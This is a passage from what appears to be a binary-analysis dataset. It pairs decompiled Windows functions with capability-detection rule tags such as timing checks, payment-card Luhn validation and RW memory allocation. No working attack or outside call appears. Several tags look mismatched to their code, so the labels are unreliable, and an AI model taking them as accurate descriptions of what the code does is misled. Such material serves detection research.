*0x802a8, 0x3e8f8),  iVar2 == 0)) &&\n            (iVar2 = fcn.0003de04(0x14fd0, 0x15758, *0x802a8, 0x3ea2c),  iVar2 == 0)) &&\n           ((iVar2 = fcn.0003de04(0x14dd0, 0x15748, *0x802a8, 0x3e194),  iVar2 == 0 &&\n            (iVar2 = (**0x7ff90)(*0x802b0),  iVar2 == 0)))) {\n            return 0;\n        }\n        (**0x7ff80)(*0x802b0);\n    }\n    (**0x7ff78)(*0x802b0);\n    *0x802b0 = 0;\n    return iVar2;\n}\n",
        "token_count": 2211
    },
    "00040008": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00040008(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.0003fcb0(arg2, arg3, *(arg1 + 0x800), *(arg1 + 0x7fc));\n    return;\n}\n",
        "token_count": 61
    },
    "00041878": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong * fcn.00041878(int64_t arg1)\n\n{\n    ulong *puVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    ulong *puVar5;\n    uint32_t uVar6;\n    ulong *puVar7;\n    ulong *puVar8;\n    ulong *puVar9;\n    int64_t iVar10;\n    uchar auStackX8 [32];\n    \n    fcn.00032650(0x80398, auStackX8, 1);\n    iVar3 = *0xfffff78000000320;\n    uVar6 = (**0x11308)();\n    puVar8 = NULL;\n    puVar7 = puVar8;\n    puVar4 = *0x803f8;\n    iVar10 = *0x80400;\n    iVar2 = *0x80400;\n    puVar9 = *0x80418;\n    while (*0x80400 = iVar10,  puVar4 != NULL) {\n        if ((uVar6 * iVar3) / 10000 - *(puVar4 + 0x34) < 0xea61) {\n            puVar7 = puVar4;\n            puVar4 = *puVar4;\n            iVar10 = *0x80400;\n        }\n        else {\n            puVar1 = *puVar4;\n            iVar10 = *0x80400 + ((-0x50 - *(puVar4 + 5)) - *(puVar4 + 3));\n            puVar5 = puVar1;\n            *0x80400 = iVar2;\n            if (puVar7 != NULL) {\n                *puVar7 = puVar1;\n                puVar5 = *0x803f8;\n            }\n            *0x803f8 = puVar5;\n            if (puVar1 == NULL) {\n                puVar9 = puVar7;\n            }\n            *0x80418 = puVar9;\n            fcn.00030d24(puVar4);\n            puVar4 = puVar1;\n            iVar2 = *0x80400;\n        }\n    }\n    fcn.00032684(0x80398, auStackX8, 1);\n    puVar7 = fcn.00030cc4(*(arg1 + 0x28) + 0x50 + *(arg1 + 0x18));\n    if (puVar7 == NULL) {\n        puVar8 = NULL;\n    }\n    else {\n        fcn.0006670a(puVar7);\n        puVar4 = puVar7 + 10;\n        puVar7[2] = puVar4;\n        puVar7[4] = *(puVar7 + 3) + puVar4;\n        fcn.0006670a(puVar4, *(arg1 + 0x10));\n        fcn.0006670a(puVar7[4], *(arg1 + 0x20));\n        iVar2 = *0xfffff78000000320;\n        uVar6 = (**0x11308)();\n        *puVar7 = 0;\n        *(puVar7 + 0x34) = (uVar6 * iVar2) / 10000;\n        fcn.00032650(0x80398, auStackX8, 1);\n        if (*(arg1 + 0x18) + 0x50 + *0x80400 + *(arg1 + 0x28) < 0x20001) {\n            puVar4 = puVar7;\n            if (*0x803f8 != NULL) {\n                **0x80418 = puVar7;\n                puVar4 = *0x803f8;\n            }\n            *0x803f8 = puVar4;\n            puVar8 = 0x1;\n            *0x80400 = *(puVar7 + 3) + *0x80400 + 0x50 + *(puVar7 + 5);\n            *0x80418 = puVar7;\n        }\n        fcn.00032684(0x80398, auStackX8, 1);\n    }\n    return puVar8;\n}\n",
        "token_count": 910
    },
    "00043c14": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.00043c14(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong uStackX24;\n    uint64_t uStackX32;\n    \n    uVar2 = 0;\n    uStackX24 = 0;\n    iVar1 = fcn.000432b4(arg1, arg2, &uStackX24, &uStackX32);\n    if ((iVar1 != 0) && (7 < uStackX32)) {\n        uVar2 = 1;\n    }\n    fcn.00030d24(uStackX24);\n    return uVar2;\n}\n",
        "token_count": 144
    },
    "00045d88": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00045d88(ulong arg1, ulong *arg2, ulong arg3, ulong arg4)\n\n{\n    int16_t iVar1;\n    uint32_t in_stack_00000028;\n    ulong uStack56;\n    uint uStack48;\n    ushort uStack44;\n    \n    fcn.0004c16c(0);\n    if ((arg3 == 0xe) && (iVar1 = fcn.00030df4(0x7ff),  *(arg2 + 0xc) == iVar1)) {\n        uStack56 = *arg2;\n        uStack48 = *(arg2 + 1);\n        uStack44 = *(arg2 + 0xc);\n        uStack44 = fcn.00030df4();\n        fcn.00041ab4(arg1, &uStack56, 0xe, arg4);\n        return;\n    }\n    fcn.0004c028(arg2, arg3, arg4, in_stack_00000028);\n    return;\n}\n",
        "token_count": 222
    },
    "00046ca8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00046ca8(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.000307e0();\n    if (iVar1 < 0x1b) {\n        fcn.0004929c(arg1, arg2, arg3, arg4);\n    }\n    else {\n        fcn.00040008(arg2, arg3, arg4);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00046cf4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00046cf4(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    ulong in_stack_00000028;\n    \n    iVar1 = fcn.000307e0();\n    if (iVar1 < 0x1b) {\n        fcn.0004913c(arg1, arg2, arg3, arg4);\n    }\n    else {\n        fcn.000400b4(arg2, arg3, arg4, in_stack_00000028);\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00046d64": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00046d64(code *arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.000307e0();\n    if ((iVar1 < 0x1b) && (arg1 != NULL)) {\n        (*arg1)(arg2, arg3, 0, 0, 0, 0, 4);\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "00046db4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00046db4(ulong noname_0, ulong arg2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.000307e0();\n    if (iVar1 < 0x1b) {\n        (*_fcn.000115b8)(arg2);\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00046dd8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00046dd8(ulong arg1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.000307e0();\n    if (iVar1 < 0x1b) {\n        fcn.00030d24(arg1);\n    }\n    else {\n        fcn.0003e0d0(arg1);\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "00047de4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.00047de4(int64_t arg1, ulong arg2, ulong noname_2, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    code *pcVar5;\n    code *pcVar6;\n    ulong uStackX8;\n    uint32_t in_stack_00000028;\n    \n    pcVar5 = NULL;\n    if ((*(arg1 + 0x200) == '\\0') && (*(arg1 + 0x201) == '\\0')) {\n        uVar1 = *(arg1 + 0x204) == 0;\n        iVar2 = fcn.00065e4c(arg4, in_stack_00000028, uVar1, *(arg1 + 0x1a1));\n        if (iVar2 == 0) {\n            iVar2 = fcn.000448f0(arg4, in_stack_00000028, uVar1);\n            if (iVar2 == 0) {\n                *(arg1 + 0x204) = *(arg1 + 0x204) + in_stack_00000028;\n                if (*(arg1 + 0x204) < 0x101) {\n                    return 0;\n                }\n                *(arg1 + 0x201) = 1;\n                return 0;\n            }\n        }\n        else {\n            iVar2 = 0xc;\n        }\n        (**0x115b0)(*(arg1 + 0x30));\n        *(arg1 + 0x200) = 1;\n        pcVar6 = pcVar5;\n        if (((*(arg1 + 0x38) != 0) && (iVar3 = fcn.000471b0(*(arg1 + 0x38), 0),  iVar3 != 0)) &&\n           (pcVar5 = NULL,  pcVar6 = NULL,  *(iVar3 + 0x68) != 0)) {\n            pcVar5 = *(iVar3 + 0x68);\n            pcVar6 = *(iVar3 + 0x70);\n        }\n        puVar4 = fcn.00030cc4(0x6c0);\n        if (puVar4 != NULL) {\n            *(puVar4 + 6) = iVar2;\n            puVar4[4] = *(arg1 + 0x28);\n            puVar4[5] = *(arg1 + 0x30);\n            fcn.0006677c(puVar4 + 7, 0, 0x80);\n            *(puVar4 + 7) = 2;\n            *(puVar4 + 0x3c) = arg2;\n            *(puVar4 + 0x17) = noname_2;\n            puVar4[0x18] = pcVar5;\n            puVar4[0x19] = pcVar6;\n            puVar4[0x1a] = *(arg1 + 0x1f8);\n            *(puVar4 + 0x6bc) = in_stack_00000028;\n            puVar4[0x1b] = uStackX8;\n            if (0x5dc < in_stack_00000028) {\n                *(puVar4 + 0x6bc) = 0x5dc;\n            }\n            fcn.0006670a(puVar4 + 0x1c, arg4, *(puVar4 + 0x6bc));\n            *(puVar4 + 0x34) = 0;\n            puVar4[3] = puVar4;\n            puVar4[2] = fcn.00044d9c;\n            *puVar4 = 0;\n            (*_fcn.000114b8)(puVar4, 1);\n            return 1;\n        }\n        (*_fcn.000115b8)(*(arg1 + 0x30));\n        *(arg1 + 0x200) = 0;\n        *(arg1 + 0x201) = 1;\n        (*pcVar5)(pcVar6, *(arg1 + 0x1f8), 0, 0, 0, 0, 2);\n    }\n    return 0;\n}\n",
        "token_count": 937
    },
    "00048744": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t fcn.00048744(uint64_t arg1, int64_t arg2, ulong *arg3)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    uint64_t uVar3;\n    uint64_t arg1_00;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int32_t iVar7;\n    uint64_t uVar8;\n    \n    uVar6 = 0;\n    uVar8 = 0;\n    bVar2 = false;\n    iVar7 = 0;\n    *arg3 = 0;\n    arg3[1] = 0;\n    piVar1 = *(arg2 + 0x20);\n    uVar3 = uVar6;\n    arg1_00 = uVar6;\n    if (piVar1 != NULL) {\n        uVar5 = 0;\n        uVar3 = (**0x11140)(piVar1, 0x28, 0, 0, 0);\n        if (uVar3 == 0) {\n            iVar7 = -0x3fffffe9;\n        }\n        else {\n            (**0x11138)(uVar3, uVar5 & 0xffffffffffffff00 | *(arg1 + 0x40), 0);\n            bVar2 = true;\n            arg1_00 = uVar8;\n            if ((piVar1[3] == 0x100) &&\n               (((piVar1[2] == 0x100 && (piVar1[4] == 1)) ||\n                ((piVar1[2] == 0x200 && (((*piVar1 == 0x301 || (*piVar1 == 0x400)) || (*piVar1 == 0x401)))))))) {\n                while ((uVar4 = uVar6,  uVar4 < *0x805c0 &&\n                       ((*(uVar6 * 0xc + 0x805c4) != *piVar1 || (*(uVar6 * 0xc + 0x805c8) != piVar1[1]))))) {\n                    uVar6 = uVar4 + 1;\n                }\n                if ((*0x805c0 <= uVar4) ||\n                   ((((*piVar1 != 0x301 || (*(uVar6 * 0xc + 0x805cc) == 0x303)) &&\n                     ((*piVar1 != 0x400 || (*(uVar6 * 0xc + 0x805cc) == 0x404)))) &&\n                    ((*piVar1 != 0x401 || (*(uVar6 * 0xc + 0x805cc) == 0x403)))))) {\n                    arg1_00 = fcn.00030c98(0x28);\n                    if (arg1_00 == 0) {\n                        iVar7 = -0x3fffff66;\n                    }\n                    else {\n                        arg3[1] = arg1_00;\n                        *arg3 = 0x47710;\n                        fcn.0006670a(arg1_00, *(arg2 + 0x20), 0x28);\n                    }\n                }\n            }\n        }\n    }\n    if (iVar7 != 0) {\n        fcn.00030d24(arg1_00);\n    }\n    if (uVar3 != 0) {\n        if (bVar2) {\n            (**0x11130)(uVar3);\n        }\n        (*_fcn.00011128)(uVar3);\n    }\n    *(arg1 + 0x30) = iVar7;\n    return arg1 & 0xffffffffffffff00 | iVar7 == 0;\n}\n",
        "token_count": 808
    },
    "000494ac": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t fcn.000494ac(ulong arg1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    ulong auStackX24 [2];\n    \n    LOCK();\n    bVar2 = *0x8c5c8 == 0;\n    *0x8c5c8 = *0x8c5c8 ^ bVar2 * (*0x8c5c8 ^ 1);\n    if (!bVar2 * *0x8c5c8 == 1) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00030a40(0x15c28, auStackX24);\n        if (((iVar1 == 0) && (iVar1 = fcn.0004e130(auStackX24[0], 0x15c10, 0x80598),  iVar1 == 0)) &&\n           (iVar1 = fcn.0004e130(auStackX24[0], 0x15bf8, 0x805a0),  iVar1 == 0)) {\n            iVar1 = fcn.00046ecc();\n            if (((iVar1 != 0) || (iVar1 = fcn.00017460(0x15be0, 0x805a8),  iVar1 != 0)) ||\n               (iVar1 = fcn.000177a4(*0x805a8, 0x48f34, 0),  iVar1 != 0)) {\n                fcn.00048ef0(arg1);\n                LOCK();\n                *0x8c5c8 = *0x8c5c8 - 1;\n            }\n        }\n        else {\n            iVar1 = -0x3fffffff;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 394
    },
    "0004a1a4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0004a1a4(ulong arg1, uint32_t *arg2, ulong arg3)\n\n{\n    int64_t **ppiVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t **arg1_00;\n    uint64_t uVar5;\n    ulong uVar6;\n    uint64_t uVar7;\n    int64_t **ppiVar8;\n    char in_R9B;\n    bool bVar9;\n    \n    if ((*0x8c5d0 < 10000) && (arg1_00 = fcn.00030cc4(0x40),  arg1_00 != NULL)) {\n        uVar7 = 0;\n        fcn.0006677c(arg1_00, 0);\n        *(arg1_00 + 3) = arg3;\n        *(arg1_00 + 0x1c) = arg1;\n        if (arg2 != NULL) {\n            *(arg1_00 + 4) = *arg2;\n            *(arg1_00 + 0x24) = *(arg2 + 1);\n        }\n        if (in_R9B == '\\0') {\n            *(arg1_00 + 0x2c) = *(arg1_00 + 0x2c) + 1;\n        }\n        else {\n            *(arg1_00 + 5) = *(arg1_00 + 5) + 1;\n        }\n        fcn.00031204(arg1_00 + 7);\n        uVar5 = (**0x113f0)();\n        if (*0x8c5d0 < 10000) {\n            ppiVar1 = *0x8c5d8;\n            if (*0x8c5d8 != NULL) {\n                do {\n                    while( true ) {\n                        ppiVar8 = ppiVar1;\n                        if ((*(ppiVar8 + 3) == arg3) && (*(ppiVar8 + 0x1c) == arg1)) {\n                            if (in_R9B == '\\0') {\n                                *(ppiVar8 + 0x2c) = *(ppiVar8 + 0x2c) + 1;\n                            }\n                            else {\n                                *(ppiVar8 + 5) = *(ppiVar8 + 5) + 1;\n                            }\n                            if (arg2 != NULL) {\n                                uVar7 = 0x8d280;\n                                bVar9 = *(ppiVar8 + 4) < *0x8d280;\n                                if ((*(ppiVar8 + 4) == *0x8d280) &&\n                                   (bVar9 = *(ppiVar8 + 0x24) < *0x8d284,  *(ppiVar8 + 0x24) == *0x8d284)) {\n                                    iVar4 = 0;\n                                }\n                                else {\n                                    iVar4 = (1 - bVar9) - (bVar9 != 0);\n                                }\n                                if (iVar4 == 0) {\n                                    *(ppiVar8 + 4) = *arg2;\n                                    *(ppiVar8 + 0x24) = *(arg2 + 1);\n                                }\n                                else {\n                                    bVar9 = *(ppiVar8 + 4) < *arg2;\n                                    if ((*(ppiVar8 + 4) == *arg2) &&\n                                       (bVar9 = *(ppiVar8 + 0x24) < *(arg2 + 1),  *(ppiVar8 + 0x24) == *(arg2 + 1))) {\n                                        iVar4 = 0;\n                                    }\n                                    else {\n                                        iVar4 = (1 - bVar9) - (bVar9 != 0);\n                                    }\n                                    if (iVar4 != 0) {\n                                        *(ppiVar8 + 6) = *(ppiVar8 + 6) + 1;\n                                    }\n                                }\n                            }\n                            fcn.00031204(ppiVar8 + 7);\n                            goto code_r0x0004a31b;\n                        }\n                        uVar2 = fcn.00030dc8(*(ppiVar8 + 3));\n                        uVar3 = fcn.00030dc8(arg3);\n                        if (uVar3 < uVar2) break;\n                        ppiVar1 = ppiVar8[1];\n                        if (ppiVar8[1] == NULL) {\n                            ppiVar8[1] = arg1_00;\n                            goto code_r0x0004a34c;\n                        }\n                    }\n                    ppiVar1 = *ppiVar8;\n                } while (*ppiVar8 != NULL);\n                *ppiVar8 = arg1_00;\ncode_r0x0004a34c:\n                ppiVar1 = *0x8c5d8;\n                *0x8c5d0 = *0x8c5d0 + 1;\n                arg1_00[2] = (*0x8c5d8)[2];\n                ppiVar1[2] = arg1_00;\n                arg1_00 = *0x8c5d8;\n            }\n        }\n        else {\ncode_r0x0004a31b:\n            fcn.00030d24(arg1_00);\n            arg1_00 = *0x8c5d8;\n        }\n        *0x8c5d8 = arg1_00;\n        (**0x113e8)(0x8d260, uVar7 & 0xffffffffffffff00 | uVar5 & 0xff);\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = 0;\n    }\n    return uVar6;\n}\n",
        "token_count": 1248
    },
    "0004cf30": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.0004cf30(ulong *arg1, ulong noname_1, ulong arg3)\n\n{\n    ulong uVar1;\n    uint64_t uStack72;\n    ulong uStack64;\n    uint auStack56 [2];\n    ulong uStack48;\n    ulong uStack40;\n    uint uStack32;\n    ulong uStack24;\n    ulong uStack16;\n    \n    if (arg1 == NULL) {\n        uVar1 = 0x21590065;\n    }\n    else if (arg3 == 0) {\n        *arg1 = 0;\n        uVar1 = 0;\n    }\n    else {\n        uStack72 = arg3;\n        uStack48 = 0;\n        uStack40 = 0;\n        uStack24 = 0;\n        uStack16 = 0;\n        uStack64 = 0;\n        auStack56[0] = 0x30;\n        uStack32 = 0x200;\n        uVar1 = fcn.000667b2(arg1, noname_1, auStack56, &uStack72);\n    }\n    return uVar1;\n}\n",
        "token_count": 249
    },
    "0004cf94": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "allocate memory",
            "allocate RW memory"
        ],
        "decompiled_code": "\nvoid fcn.0004cf94(ulong arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int32_t iVar3;\n    uint64_t uStackX16;\n    uchar auStackX24 [16];\n    ulong in_stack_ffffffffffffffa8;\n    uint uVar5;\n    uchar *puVar4;\n    uint64_t uStack72;\n    int64_t aiStack64 [2];\n    \n    uVar5 = in_stack_ffffffffffffffa8 >> 0x20;\n    fcn.0006677c(arg2, 0, 0x28);\n    piVar1 = arg2 + 0x20;\n    if (arg3 < 0x100000) {\n        arg3._0_4_ = 0x100000;\n    }\n    uStack72 = arg3;\n    *piVar1 = 0;\n    puVar4 = CONCAT44(uVar5, 0x2000);\n    iVar3 = fcn.00066902(arg1, piVar1, 0, &uStack72, puVar4, 4);\n    if (iVar3 == 0) {\n        uStackX16 = arg4 + 0x1000;\n        if (arg4 < 0x2000) {\n            uStackX16 = 0x2000;\n        }\n        *(arg2 + 0x10) = *piVar1 + uStack72;\n        if (uStack72 <= uStackX16) {\n            uStackX16 = uStack72 - 0x1000;\n        }\n        piVar2 = arg2 + 0x18;\n        *piVar2 = (*piVar1 + uStack72) - uStackX16;\n        puVar4 = 0x1000;\n        iVar3 = fcn.00066902(arg1, piVar2, 0, &uStackX16, 0x1000, 4);\n        if (iVar3 == 0) {\n            aiStack64[0] = *piVar2;\n            puVar4 = auStackX24;\n            uStackX16 = 0x1000;\n            iVar3 = fcn.0001ea78(arg1, aiStack64, &uStackX16, 0x104);\n            if (iVar3 == 0) {\n                return;\n            }\n        }\n    }\n    uStackX16 = 0;\n    fcn.00066908(arg1, piVar1, &uStackX16, 0x8000, puVar4);\n    fcn.00066782(iVar3);\n    return;\n}\n",
        "token_count": 590
    },
    "0004d7dc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0004d7dc(ulong arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    ulong auStackX24 [2];\n    uchar auStack312 [280];\n    \n    iVar2 = fcn.000308cc(arg1, 0x2e);\n    if (iVar2 == 0) {\n        uVar3 = 0x2159000d;\n    }\n    else {\n        uVar1 = (iVar2 + 1) - arg1;\n        if (uVar1 < 0x104) {\n            fcn.000308a4(auStack312, arg1, uVar1);\n            auStack312[uVar1] = 0;\n            uVar3 = fcn.00030a40(auStack312, auStackX24);\n            if (uVar3 == 0) {\n                uVar3 = fcn.0004e130(auStackX24[0], iVar2 + 1, arg2);\n            }\n        }\n        else {\n            uVar3 = 0x2159000b;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 260
    },
    "0004dacc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0004dacc(ulong arg1, int64_t *arg2)\n\n{\n    uint64_t uVar1;\n    bool bVar2;\n    int64_t iStackX16;\n    int64_t aiStackX24 [2];\n    \n    iStackX16 = arg2[1];\n    aiStackX24[0] = *arg2;\n    uVar1 = fcn.0004cdec(arg1, aiStackX24[0] + 8, &iStackX16, 8);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        uVar1 = fcn.0004cdec(arg1, iStackX16, aiStackX24, 8);\n        bVar2 = uVar1 == 0;\n    }\n    return uVar1 & 0xffffffffffffff00 | bVar2;\n}\n",
        "token_count": 197
    },
    "0004dbe4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.0004dbe4(ulong arg1, uint32_t *arg2)\n\n{\n    uint64_t uVar1;\n    bool bVar2;\n    uint32_t auStackX16 [2];\n    uint32_t auStackX24 [4];\n    \n    auStackX24[0] = *arg2;\n    auStackX16[0] = arg2[1];\n    uVar1 = fcn.0004cdec(arg1, auStackX24[0] + 4, auStackX16, 4);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        uVar1 = fcn.0004cdec(arg1, auStackX16[0], auStackX24, 4);\n        bVar2 = uVar1 == 0;\n    }\n    return uVar1 & 0xffffffffffffff00 | bVar2;\n}\n",
        "token_count": 203
    },
    "0004dfb8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.0004dfb8(ulong arg1, uint32_t *arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *apuStackX16 [3];\n    \n    uVar4 = 0;\n    apuStackX16[0] = NULL;\n    if (arg2 == NULL) {\n        return 0x21590067;\n    }\n    uVar1 = fcn.00030564(5, apuStackX16);\n    puVar2 = apuStackX16[0];\n    if (uVar1 == 0) {\n        do {\n            if (*(puVar2 + 0x14) == arg1) goto code_r0x0004e011;\n            puVar2 = puVar2 + *puVar2;\n        } while (*puVar2 != 0);\n        if (*(puVar2 + 0x14) == arg1) {\ncode_r0x0004e011:\n            if (puVar2[1] != 0) {\n                if (puVar2[1] != 0) {\n                    puVar3 = puVar2 + 0x4c;\n                    uVar4 = 0;\n                    do {\n                        *arg2 = *puVar3;\n                        uVar1 = fcn.0006675e();\n                        if ((arg1 != uVar1) || (uVar1 = fcn.000667ac(),  *arg2 != uVar1)) break;\n                        uVar4 = uVar4 + 1;\n                        puVar3 = puVar3 + 0x14;\n                    } while (uVar4 < puVar2[1]);\n                }\n                uVar1 = ~-(uVar4 < puVar2[1]) & 0x21590005;\n                goto code_r0x0004e058;\n            }\n        }\n        uVar1 = 0x21590005;\n    }\ncode_r0x0004e058:\n    fcn.00030d24(apuStackX16[0]);\n    return uVar1;\n}\n",
        "token_count": 476
    },
    "0005057c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.0005057c(ulong arg1, int64_t arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    \n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        iVar2 = fcn.00066746(arg2, 0x5c);\n        if (iVar2 == 0) {\n            fcn.00066746(arg2, 0x2f);\n        }\n        uVar1 = fcn.0004f4e0(arg1, arg2);\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "00050fdc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.00050fdc(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    ulong auStackX16 [2];\n    code *pcStackX32;\n    uint auStack40 [2];\n    int64_t iStack32;\n    int64_t iStack24;\n    uint32_t uStack16;\n    \n    if (arg2 == 0) {\n        uVar3 = 0x21590066;\n    }\n    else if (arg3 == 0) {\n        uVar3 = 0x21590067;\n    }\n    else {\n        auStack40[0] = arg1;\n        iStack32 = arg2;\n        iStack24 = arg3;\n        iVar1 = fcn.000307e0();\n        if ((0x1a < iVar1) && ((**0x114f0)(&pcStackX32, auStackX16),  auStackX16 - pcStackX32 < 0x2000)) {\n            uVar3 = fcn.00030a40(73000, auStackX16);\n            if (uVar3 != 0) {\n                return uVar3;\n            }\n            uVar3 = fcn.0004e130(auStackX16[0], 0x15e40, &pcStackX32);\n            if (uVar3 != 0) {\n                return uVar3;\n            }\n            uVar2 = (*pcStackX32)(fcn.000509f0, auStack40, 0xe800, 1, 0);\n            if (uVar2 != 0) {\n                uStack16 = uVar2;\n            }\n            return uStack16;\n        }\n        iVar1 = fcn.000307e0();\n        if ((iVar1 < 0x1b) && ((**0x114f0)(&pcStackX32, auStackX16),  auStackX16 - pcStackX32 < 0xc00)) {\n            return 0x21590004;\n        }\n        fcn.000509f0(auStack40);\n        uVar3 = uStack16;\n    }\n    return uVar3;\n}\n",
        "token_count": 499
    },
    "00051ffc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.00051ffc(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    ulong auStackX16 [2];\n    code *pcStackX32;\n    uint auStack40 [2];\n    ulong uStack32;\n    uint32_t uStack20;\n    \n    uStack20 = 0xffffffff;\n    auStack40[0] = arg1;\n    uStack32 = arg2;\n    iVar1 = fcn.000307e0();\n    if ((iVar1 < 0x1b) || ((**0x114f0)(&pcStackX32, auStackX16),  0x1fff < auStackX16 - pcStackX32)) {\n        iVar1 = fcn.000307e0();\n        if ((iVar1 < 0x1b) && ((**0x114f0)(&pcStackX32, auStackX16),  auStackX16 - pcStackX32 < 0xc00)) {\n            return 0x21590004;\n        }\n        fcn.00051df4(auStack40);\n        return uStack20;\n    }\n    uVar3 = fcn.00030a40(73000, auStackX16);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    uVar3 = fcn.0004e130(auStackX16[0], 0x15e40, &pcStackX32);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    uVar2 = (*pcStackX32)(fcn.00051df4, auStack40, 0xe800, 1, 0);\n    if (uVar2 != 0) {\n        uStack20 = uVar2;\n    }\n    return uStack20;\n}\n",
        "token_count": 420
    },
    "00052c90": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00052c90(int64_t arg1)\n\n{\n    fcn.0005247c(arg1);\n    if (*(*(arg1 + 8) + 0x13a + arg1) == '\\x0f') {\n        fcn.00052904(arg1);\n    }\n    else {\n        fcn.000527a4(arg1);\n    }\n    *(arg1 + 0xc0) = **(arg1 + 0xb8);\n    return;\n}\n",
        "token_count": 107
    },
    "00052cd4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
